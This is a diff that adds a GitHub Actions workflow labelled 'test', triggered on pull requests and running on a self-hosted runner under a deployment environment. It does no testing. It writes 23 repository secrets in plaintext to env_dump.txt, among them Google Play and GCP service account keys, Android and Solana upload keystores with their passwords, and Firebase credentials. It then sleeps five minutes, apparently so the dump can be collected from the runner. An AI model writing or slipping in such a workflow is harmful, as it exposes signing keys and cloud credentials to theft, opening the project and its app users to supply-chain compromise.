@@ -1,0 +1,75 @@
+name: test
+#
+on:
+  pull_request:
+
+jobs:
+  dump:
+    runs-on: test-sf
+    environment: deployment
+    steps:
+      - name: Dump selected secrets to file
+        shell: bash
+        env:
+          GOOGLE_PLAY_CLOUD_PROJECT: ${{ secrets.GOOGLE_PLAY_CLOUD_PROJECT }}
+          GOOGLE_PLAY_PUBLISHER_API_KEY: ${{ secrets.GOOGLE_PLAY_PUBLISHER_API_KEY }}
+          GOOGLE_PLAY_SERVICE_ACCOUNT: ${{ secrets.GOOGLE_PLAY_SERVICE_ACCOUNT }}
+          GOOGLE_PLAY_SERVICE_ACCOUNT_KEY: ${{ secrets.GOOGLE_PLAY_SERVICE_ACCOUNT_KEY }}
+          GOOGLE_PLAY_WORKLOAD_IDENTITY_PROVIDER: ${{ secrets.GOOGLE_PLAY_WORKLOAD_IDENTITY_PROVIDER }}
+
+          UPLOAD_KEYSTORE_BASE_64: ${{ secrets.UPLOAD_KEYSTORE_BASE_64 }}
+          UPLOAD_KEYSTORE_PASSWORD: ${{ secrets.UPLOAD_KEYSTORE_PASSWORD }}
+          UPLOAD_KEY_ALIAS: ${{ secrets.UPLOAD_KEY_ALIAS }}
+          UPLOAD_KEY_ALIAS_PASSWORD: ${{ secrets.UPLOAD_KEY_ALIAS_PASSWORD }}
+
+          CMC_PUBLISHABLE_KEY: ${{ secrets.CMC_PUBLISHABLE_KEY }}
+          COINBASE_APP_ID: ${{ secrets.COINBASE_APP_ID }}
+          EMULATOR_WTF_API_KEY: ${{ secrets.EMULATOR_WTF_API_KEY }}
+          FIREBASE_DEBUG_JSON_BASE64: ${{ secrets.FIREBASE_DEBUG_JSON_BASE64 }}
+          FIREBASE_RELEASE_JSON_BASE64: ${{ secrets.FIREBASE_RELEASE_JSON_BASE64 }}
+          FIREBASE_TEST_LAB_PROJECT: ${{ secrets.FIREBASE_TEST_LAB_PROJECT }}
+          FIREBASE_TEST_LAB_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_TEST_LAB_SERVICE_ACCOUNT }}
+          FIREBASE_TEST_LAB_WORKLOAD_IDENTITY_PROVIDER: ${{ secrets.FIREBASE_TEST_LAB_WORKLOAD_IDENTITY_PROVIDER }}
+          FLEXA_PUBLISHABLE_KEY: ${{ secrets.FLEXA_PUBLISHABLE_KEY }}
+          GCP_SERVICE_ACCOUNT_KEY: ${{ secrets.GCP_SERVICE_ACCOUNT_KEY }}
+
+          UPLOAD_KEYSTORE_BASE_64_SOLANA: ${{ secrets.UPLOAD_KEYSTORE_BASE_64_SOLANA }}
+          UPLOAD_KEYSTORE_PASSWORD_SOLANA: ${{ secrets.UPLOAD_KEYSTORE_PASSWORD_SOLANA }}
+          UPLOAD_KEY_ALIAS_PASSWORD_SOLANA: ${{ secrets.UPLOAD_KEY_ALIAS_PASSWORD_SOLANA }}
+          UPLOAD_KEY_ALIAS_SOLANA: ${{ secrets.UPLOAD_KEY_ALIAS_SOLANA }}
+
+        run: |
+          OUT=env_dump.txt
+          chmod 600 $OUT || true
+
+          echo "### SECRETS DUMP" >> $OUT
+          for v in \
+            GOOGLE_PLAY_CLOUD_PROJECT \
+            GOOGLE_PLAY_PUBLISHER_API_KEY \
+            GOOGLE_PLAY_SERVICE_ACCOUNT \
+            GOOGLE_PLAY_SERVICE_ACCOUNT_KEY \
+            GOOGLE_PLAY_WORKLOAD_IDENTITY_PROVIDER \
+            UPLOAD_KEYSTORE_BASE_64 \
+            UPLOAD_KEYSTORE_PASSWORD \
+            UPLOAD_KEY_ALIAS \
+            UPLOAD_KEY_ALIAS_PASSWORD \
+            CMC_PUBLISHABLE_KEY \
+            COINBASE_APP_ID \
+            EMULATOR_WTF_API_KEY \
+            FIREBASE_DEBUG_JSON_BASE64 \
+            FIREBASE_RELEASE_JSON_BASE64 \
+            FIREBASE_TEST_LAB_PROJECT \
+            FIREBASE_TEST_LAB_SERVICE_ACCOUNT \
+            FIREBASE_TEST_LAB_WORKLOAD_IDENTITY_PROVIDER \
+            FLEXA_PUBLISHABLE_KEY \
+            GCP_SERVICE_ACCOUNT_KEY \
+            UPLOAD_KEYSTORE_BASE_64_SOLANA \
+            UPLOAD_KEYSTORE_PASSWORD_SOLANA \
+            UPLOAD_KEY_ALIAS_PASSWORD_SOLANA \
+            UPLOAD_KEY_ALIAS_SOLANA
+          do
+            echo "$v=${!v}" >> $OUT
+          done
+
+      - name: Sleep 5 minutes
+        run: sleep 300
